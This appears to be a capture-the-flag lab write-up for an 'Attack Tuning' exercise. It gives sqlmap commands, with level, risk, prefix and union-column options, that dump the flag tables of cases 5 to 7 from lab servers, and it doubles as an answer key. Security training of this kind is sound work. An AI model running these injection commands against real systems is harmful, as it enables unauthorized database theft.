# [Attack Tuning](Attack%20Tuning.md)
### What's the contents of table flag5? (Case #5)

```shell
sqlmap -u http://154.57.164.76:30553/case5.php?id=1 -T flag5 -D testdb --level 5 --risk 3 --batch --dump
```
![](Screenshot%202026-06-22%20at%2014.24.25.png)

```shell
sqlmap -u http://154.57.164.76:30553/case5.php?id=1 -T flag5 -D testdb --level 5 --risk 3 --batch --dump --fresh-queries --threads=10
```
![](Screenshot%202026-06-22%20at%2014.24.45.png)

### What's the contents of table flag6? (Case #6)

```shell
sqlmap -u 'http://154.57.164.80:31657/case6.php?col=id' --prefix='`)' -T flag6 --batch --dump
```
![](Screenshot%202026-06-22%20at%2013.48.25.png)
### What's the contents of table flag7? (Case #7)

```shell
sqlmap http://154.57.164.76:30553/case7.php?id=1 --union-cols 5-8 --level=3 --risk=3 --dump -T flag7 --technique=U -D testdb
```
![](Screenshot%202026-06-22%20at%2014.29.54.png)